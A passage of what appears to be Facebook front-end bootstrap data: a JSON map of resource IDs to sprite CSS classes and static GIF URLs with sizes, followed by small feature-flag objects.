                    },
                    "295517": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/5mTAErZLJYB.gif",
                        "width": 516,
                        "height": 162
                    },
                    "295520": {
                        "sprited": 1,
                        "spriteCssClass": "sx_28bf01",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "295522": {
                        "sprited": 1,
                        "spriteCssClass": "sx_33f600",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "295524": {
                        "sprited": 1,
                        "spriteCssClass": "sx_532385",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "295526": {
                        "sprited": 1,
                        "spriteCssClass": "sx_19bb4b",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "295528": {
                        "sprited": 1,
                        "spriteCssClass": "sx_ac8c58",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "363511": {
                        "sprited": 1,
                        "spriteCssClass": "sx_b17594",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "363532": {
                        "sprited": 1,
                        "spriteCssClass": "sx_81eaa7",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "363585": {
                        "sprited": 1,
                        "spriteCssClass": "sx_589cfb",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "363586": {
                        "sprited": 1,
                        "spriteCssClass": "sx_cc260a",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "376185": {
                        "sprited": 1,
                        "spriteCssClass": "sx_9c847c",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "378280": {
                        "sprited": 1,
                        "spriteCssClass": "sx_54233c",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "385699": {
                        "sprited": 1,
                        "spriteCssClass": "sx_a036af",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "388066": {
                        "sprited": 1,
                        "spriteCssClass": "sx_645614",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "390679": {
                        "sprited": 1,
                        "spriteCssClass": "sx_ebe9bb",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "394327": {
                        "sprited": 1,
                        "spriteCssClass": "sx_a55dfa",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "403739": {
                        "sprited": 1,
                        "spriteCssClass": "sx_f8624f",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "403741": {
                        "sprited": 1,
                        "spriteCssClass": "sx_362627",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "403742": {
                        "sprited": 1,
                        "spriteCssClass": "sx_e206a9",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "403743": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6e1bae",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "407178": {
                        "sprited": 1,
                        "spriteCssClass": "sx_77c282",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "407620": {
                        "sprited": 1,
                        "spriteCssClass": "sx_840de5",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "478237": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6679ef",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "478324": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6b45ae",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "479176": {
                        "sprited": 1,
                        "spriteCssClass": "sx_f0b7dc",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "480267": {
                        "sprited": 1,
                        "spriteCssClass": "sx_9a1223",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "480789": {
                        "sprited": 1,
                        "spriteCssClass": "sx_a0ca0b",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "480790": {
                        "sprited": 1,
                        "spriteCssClass": "sx_67b773",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "481013": {
                        "sprited": 1,
                        "spriteCssClass": "sx_463b9b",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "481883": {
                        "sprited": 1,
                        "spriteCssClass": "sx_c8cea0",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "482773": {
                        "sprited": 1,
                        "spriteCssClass": "sx_40eda4",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "483254": {
                        "sprited": 1,
                        "spriteCssClass": "sx_692586",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "483850": {
                        "sprited": 1,
                        "spriteCssClass": "sx_29296f",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "483854": {
                        "sprited": 1,
                        "spriteCssClass": "sx_82be38",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "484391": {
                        "sprited": 1,
                        "spriteCssClass": "sx_af38bf",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "484757": {
                        "sprited": 1,
                        "spriteCssClass": "sx_ad9241",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "484864": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0095d2",
                        "spriteMapCssClass": "sp_XqH5B9XRcD6"
                    },
                    "485955": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6e5e7f",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "489535": {
                        "sprited": 1,
                        "spriteCssClass": "sx_b3902c",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "489947": {
                        "sprited": 1,
                        "spriteCssClass": "sx_1bb2f5",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "489948": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6ec0a8",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "490190": {
                        "sprited": 1,
                        "spriteCssClass": "sx_f8dfad",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "490191": {
                        "sprited": 1,
                        "spriteCssClass": "sx_099e4d",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "492454": {
                        "sprited": 1,
                        "spriteCssClass": "sx_f47d33",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "492518": {
                        "sprited": 1,
                        "spriteCssClass": "sx_7ccac7",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "492521": {
                        "sprited": 1,
                        "spriteCssClass": "sx_603218",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "492572": {
                        "sprited": 1,
                        "spriteCssClass": "sx_312d3f",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "492575": {
                        "sprited": 1,
                        "spriteCssClass": "sx_7e89f3",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "492704": {
                        "sprited": 1,
                        "spriteCssClass": "sx_87a225",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "492920": {
                        "sprited": 1,
                        "spriteCssClass": "sx_566314",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "492942": {
                        "sprited": 1,
                        "spriteCssClass": "sx_b76936",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "494557": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0a3a21",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "495429": {
                        "sprited": 1,
                        "spriteCssClass": "sx_308f83",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "495440": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6d6bbd",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "495838": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0d67f1",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "496752": {
                        "sprited": 1,
                        "spriteCssClass": "sx_ad2d40",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "496757": {
                        "sprited": 1,
                        "spriteCssClass": "sx_c66629",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "496949": {
                        "sprited": 1,
                        "spriteCssClass": "sx_37963c",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "497803": {
                        "sprited": 1,
                        "spriteCssClass": "sx_f78609",
                        "spriteMapCssClass": "sp_XqH5B9XRcD6"
                    },
                    "499666": {
                        "sprited": 1,
                        "spriteCssClass": "sx_d6cd8f",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "499667": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6c91b7",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "499672": {
                        "sprited": 1,
                        "spriteCssClass": "sx_a6cb43",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "499673": {
                        "sprited": 1,
                        "spriteCssClass": "sx_26fd33",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "499674": {
                        "sprited": 1,
                        "spriteCssClass": "sx_016c8c",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "499675": {
                        "sprited": 1,
                        "spriteCssClass": "sx_bfd27e",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "499680": {
                        "sprited": 1,
                        "spriteCssClass": "sx_8ace72",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "499681": {
                        "sprited": 1,
                        "spriteCssClass": "sx_8d78a7",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "501423": {
                        "sprited": 1,
                        "spriteCssClass": "sx_9ef31b",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "502061": {
                        "sprited": 1,
                        "spriteCssClass": "sx_7b9e4e",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "503180": {
                        "sprited": 1,
                        "spriteCssClass": "sx_b1f257",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "504839": {
                        "sprited": 1,
                        "spriteCssClass": "sx_39f9c7",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "505565": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0fe552",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "505782": {
                        "sprited": 1,
                        "spriteCssClass": "sx_4d9ab1",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "505789": {
                        "sprited": 1,
                        "spriteCssClass": "sx_077e6a",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "505794": {
                        "sprited": 1,
                        "spriteCssClass": "sx_cefc07",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "506111": {
                        "sprited": 1,
                        "spriteCssClass": "sx_fa32ae",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "513652": {
                        "sprited": 1,
                        "spriteCssClass": "sx_067fea",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "518439": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0d239c",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "532386": {
                        "sprited": 1,
                        "spriteCssClass": "sx_57753c",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "534677": {
                        "sprited": 1,
                        "spriteCssClass": "sx_af33af",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "536885": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/RzpWVbK--75.gif",
                        "width": 350,
                        "height": 180
                    },
                    "536888": {
                        "sprited": 1,
                        "spriteCssClass": "sx_d7f57e",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "536891": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0cea28",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "540407": {
                        "sprited": 1,
                        "spriteCssClass": "sx_9c34b3",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "541615": {
                        "sprited": 1,
                        "spriteCssClass": "sx_1773f8",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "545517": {
                        "sprited": 1,
                        "spriteCssClass": "sx_dd42da",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "547567": {
                        "sprited": 1,
                        "spriteCssClass": "sx_900a2d",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "550097": {
                        "sprited": 1,
                        "spriteCssClass": "sx_196767",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "558875": {
                        "sprited": 1,
                        "spriteCssClass": "sx_303921",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "561300": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0f04a9",
                        "spriteMapCssClass": "sp_XqH5B9XRcD6"
                    },
                    "561301": {
                        "sprited": 1,
                        "spriteCssClass": "sx_1201e3",
                        "spriteMapCssClass": "sp_XqH5B9XRcD6"
                    },
                    "561364": {
                        "sprited": 1,
                        "spriteCssClass": "sx_9bbe76",
                        "spriteMapCssClass": "sp_XqH5B9XRcD6"
                    },
                    "579554": {
                        "sprited": 1,
                        "spriteCssClass": "sx_8a2a8f",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "583898": {
                        "sprited": 1,
                        "spriteCssClass": "sx_22e807",
                        "spriteMapCssClass": "sp_hVOfTFmv8up"
                    },
                    "621399": {
                        "sprited": 1,
                        "spriteCssClass": "sx_034f10",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "621502": {
                        "sprited": 1,
                        "spriteCssClass": "sx_f9004a",
                        "spriteMapCssClass": "sp_XqH5B9XRcD6"
                    },
                    "636187": {
                        "sprited": 1,
                        "spriteCssClass": "sx_4c7a35",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "652056": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0043e3",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "659288": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0460ed",
                        "spriteMapCssClass": "sp_ctbsl_LDwMS"
                    },
                    "679141": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0ecb6d",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "701592": {
                        "sprited": 1,
                        "spriteCssClass": "sx_a9db73",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "702177": {
                        "sprited": 1,
                        "spriteCssClass": "sx_ebf7fa",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "702721": {
                        "sprited": 1,
                        "spriteCssClass": "sx_932ba5",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "712832": {
                        "sprited": 1,
                        "spriteCssClass": "sx_0e88c8",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "825952": {
                        "sprited": 1,
                        "spriteCssClass": "sx_b9e78e",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "846080": {
                        "sprited": 1,
                        "spriteCssClass": "sx_c5665c",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "897949": {
                        "sprited": 1,
                        "spriteCssClass": "sx_ba83e9",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "999128": {
                        "sprited": 1,
                        "spriteCssClass": "sx_1eb30e",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1207963": {
                        "sprited": 1,
                        "spriteCssClass": "sx_ec1caa",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "1208628": {
                        "sprited": 1,
                        "spriteCssClass": "sx_00beed",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "1208638": {
                        "sprited": 1,
                        "spriteCssClass": "sx_709467",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "1236291": {
                        "sprited": 1,
                        "spriteCssClass": "sx_246577",
                        "spriteMapCssClass": "sp_hVOfTFmv8up"
                    },
                    "1236292": {
                        "sprited": 1,
                        "spriteCssClass": "sx_3bb65b",
                        "spriteMapCssClass": "sp_XqH5B9XRcD6"
                    },
                    "1358904": {
                        "sprited": 1,
                        "spriteCssClass": "sx_989e77",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1364737": {
                        "sprited": 1,
                        "spriteCssClass": "sx_a36670",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1409800": {
                        "sprited": 1,
                        "spriteCssClass": "sx_e1ab9d",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1423549": {
                        "sprited": 1,
                        "spriteCssClass": "sx_500daa",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1474920": {
                        "sprited": 1,
                        "spriteCssClass": "sx_99fe18",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1474928": {
                        "sprited": 1,
                        "spriteCssClass": "sx_5259b6",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1548449": {
                        "sprited": 1,
                        "spriteCssClass": "sx_475b61",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1572214": {
                        "sprited": 1,
                        "spriteCssClass": "sx_9f22da",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1607943": {
                        "sprited": 1,
                        "spriteCssClass": "sx_af20b0",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1647511": {
                        "sprited": 1,
                        "spriteCssClass": "sx_d62769",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1663241": {
                        "sprited": 1,
                        "spriteCssClass": "sx_43addc",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1739808": {
                        "sprited": 1,
                        "spriteCssClass": "sx_2e0c10",
                        "spriteMapCssClass": "sp_c-lO39P_BpW"
                    },
                    "1876411": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/r\/3mD7kKai_7W.gif",
                        "width": 12,
                        "height": 12
                    },
                    "1876412": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y1\/r\/mHADa0fT0mI.gif",
                        "width": 16,
                        "height": 16
                    },
                    "1876413": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yV\/r\/ZY0eC865SgX.gif",
                        "width": 20,
                        "height": 20
                    },
                    "1876414": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y8\/r\/M3mvaC7u8oH.gif",
                        "width": 24,
                        "height": 24
                    },
                    "1876415": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/r\/hVe2HmwMRpE.gif",
                        "width": 32,
                        "height": 32
                    },
                    "1876416": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/r\/yFaaylccZ5L.gif",
                        "width": 48,
                        "height": 48
                    },
                    "1876418": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/96GJYGbUDCJ.gif",
                        "width": 72,
                        "height": 72
                    },
                    "1876419": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/NiR8M1k4AVU.gif",
                        "width": 12,
                        "height": 12
                    },
                    "1876420": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/FNERtXIk9xp.gif",
                        "width": 16,
                        "height": 16
                    },
                    "1876421": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/l2FWxc8ihQj.gif",
                        "width": 20,
                        "height": 20
                    },
                    "1876422": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/Io_N1z4MXYh.gif",
                        "width": 24,
                        "height": 24
                    },
                    "1876423": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yD\/r\/-1hifBvDgEQ.gif",
                        "width": 32,
                        "height": 32
                    },
                    "1876424": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/r\/RcIiVWWukEr.gif",
                        "width": 48,
                        "height": 48
                    },
                    "1876426": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/r\/9ISCYYcy94m.gif",
                        "width": 72,
                        "height": 72
                    },
                    "1876427": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/MStXnCtsaSe.gif",
                        "width": 12,
                        "height": 12
                    },
                    "1876428": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y6\/r\/dw2egiKdoVV.gif",
                        "width": 16,
                        "height": 16
                    },
                    "1876429": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/1DbfjOftY0d.gif",
                        "width": 20,
                        "height": 20
                    },
                    "1876430": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/2uPGz8a6lb6.gif",
                        "width": 24,
                        "height": 24
                    },
                    "1876431": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/r\/60r9oPEvxiL.gif",
                        "width": 32,
                        "height": 32
                    },
                    "1876432": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yM\/r\/NlAFhiEx3a1.gif",
                        "width": 48,
                        "height": 48
                    },
                    "1876434": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/uzrQzxgD_Bg.gif",
                        "width": 72,
                        "height": 72
                    },
                    "1876435": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yM\/r\/TtXj9IXnkoK.gif",
                        "width": 12,
                        "height": 12
                    },
                    "1876436": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/HNs8yq0QiXE.gif",
                        "width": 16,
                        "height": 16
                    },
                    "1876437": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yT\/r\/ay_drQe6StD.gif",
                        "width": 20,
                        "height": 20
                    },
                    "1876438": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/iACDMhAROS_.gif",
                        "width": 24,
                        "height": 24
                    },
                    "1876439": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/WEhNL1y2zoZ.gif",
                        "width": 32,
                        "height": 32
                    },
                    "1876440": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y-\/r\/mAeZkO4yhqj.gif",
                        "width": 48,
                        "height": 48
                    },
                    "1876442": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/r\/79uB7ciX8vY.gif",
                        "width": 72,
                        "height": 72
                    },
                    "1876443": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/r\/dzn6it4Fw3p.gif",
                        "width": 12,
                        "height": 12
                    },
                    "1876444": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/wqjQpFb4tea.gif",
                        "width": 16,
                        "height": 16
                    },
                    "1876445": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/yy3mR2PXKrn.gif",
                        "width": 20,
                        "height": 20
                    },
                    "1876446": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/r\/gTdm7zPKz-c.gif",
                        "width": 24,
                        "height": 24
                    },
                    "1876447": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/kdaft251gQ_.gif",
                        "width": 32,
                        "height": 32
                    },
                    "1876448": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/r\/6-FTd4KBtOk.gif",
                        "width": 48,
                        "height": 48
                    },
                    "1876450": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yq\/r\/Tks_lRPtYc-.gif",
                        "width": 72,
                        "height": 72
                    },
                    "1876451": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/r\/Bys0xcVibDa.gif",
                        "width": 12,
                        "height": 12
                    },
                    "1876452": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/Wk0dcHGH6EG.gif",
                        "width": 16,
                        "height": 16
                    },
                    "1876453": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/aOTs7vt2hEc.gif",
                        "width": 20,
                        "height": 20
                    },
                    "1876454": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/wVjfNbGZ3CH.gif",
                        "width": 24,
                        "height": 24
                    },
                    "1876455": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/r\/oT6wM_vuQNQ.gif",
                        "width": 32,
                        "height": 32
                    },
                    "1876456": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/r\/ac61i44rSWK.gif",
                        "width": 48,
                        "height": 48
                    },
                    "1876458": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yg\/r\/ZH27Vvjc9-u.gif",
                        "width": 72,
                        "height": 72
                    },
                    "1901879": {
                        "sprited": 1,
                        "spriteCssClass": "sx_e6e198",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1901901": {
                        "sprited": 1,
                        "spriteCssClass": "sx_06801c",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1901902": {
                        "sprited": 1,
                        "spriteCssClass": "sx_a1d287",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1901903": {
                        "sprited": 1,
                        "spriteCssClass": "sx_da4608",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "1940508": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/ycQ2OPoZwUA.gif",
                        "width": 64,
                        "height": 64
                    },
                    "1940509": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yg\/r\/8kyIVWHZW-b.gif",
                        "width": 64,
                        "height": 64
                    },
                    "1940510": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/r\/8gPN8wBD9yB.gif",
                        "width": 64,
                        "height": 64
                    },
                    "1940511": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/r\/WtK_u51t3nM.gif",
                        "width": 64,
                        "height": 64
                    },
                    "1940512": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/JYwEre3ewp7.gif",
                        "width": 64,
                        "height": 64
                    },
                    "1940513": {
                        "sprited": 0,
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yu\/r\/M2HDLLPAUWl.gif",
                        "width": 64,
                        "height": 64
                    }
                },
                "qexData": {
                    "832": {
                        "r": null,
                        "l": "J{\"u\":\"\",\"t\":\"fb_acting_account\",\"gks\":[],\"qe\":null}"
                    },
                    "723": {
                        "r": null
                    },
                    "234": {
                        "r": null
                    },
                    "717": {
                        "r": false
                    },
                    "858": {
                        "r": null
                    },
                    "1022": {
                        "r": null
                    },
                    "2085": {
                        "r": null
                    },
                    "2086": {
                        "r": null
                    },
                    "2087": {
                        "r": null
                    },
                    "2088": {
                        "r": null
                    },
                    "2089": {
                        "r": null
                    },
                    "2090": {
                        "r": null
                    },
                    "2091": {
                        "r": null
                    },
                    "2092": {
                        "r": null
                    },
                    "644": {
                        "r": null
                    }
                },
                "qplData": {
                    "6204": {
                        "r": 7
                    }
                },
                "justknobxData": {
                    "144": {
                        "r": true
                    },
                    "450": {
                        "r": true
                    },
                    "494": {
                        "r": true
                    },
                    "992": {
                        "r": false
                    },
                    "1203": {
                        "r": true
                    },
                    "317": {
                        "r": 16
                    },
                    "1023": {
                        "r": true
                    },
                    "344": {
                        "r": true
                    },
                    "948": {
                        "r": false
                    }
                }
            })
        });
